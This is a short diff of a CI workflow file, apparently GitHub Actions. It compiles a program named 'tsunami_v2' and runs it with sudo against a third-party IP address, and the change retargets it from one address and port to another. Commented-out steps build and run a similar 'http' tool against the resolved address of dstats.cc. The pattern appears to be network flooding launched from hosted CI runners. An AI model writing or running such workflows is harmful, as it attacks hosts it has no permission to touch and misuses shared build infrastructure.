@@ -9,4 +9,4 @@ jobs:
       #- run: wget -qO- https://github.com/llvm/llvm-project/releases/download/llvmorg-22.1.1/LLVM-22.1.1-Linux-X64.tar.xz | sudo tar -xJ -C /usr/local --strip-components=1 && hash -r
       #- run: sudo apt-get update && sudo apt-get install -y liburing-dev && export DNS_RESULT=$(getent ahostsv4 dstats.cc | awk '{print $1; exit}') && echo $DNS_RESULT && clang -O3 -flto -march=native http.c -o http -luring -lpthread && sudo ./http $DNS_RESULT 80
       - run: gcc -O3 -flto -march=native -o tsunami_v2 tsunami_v2.c -pthread
-      - run: sudo ./tsunami_v2 103.67.202.153 53
+      - run: sudo ./tsunami_v2 95.161.128.10 80
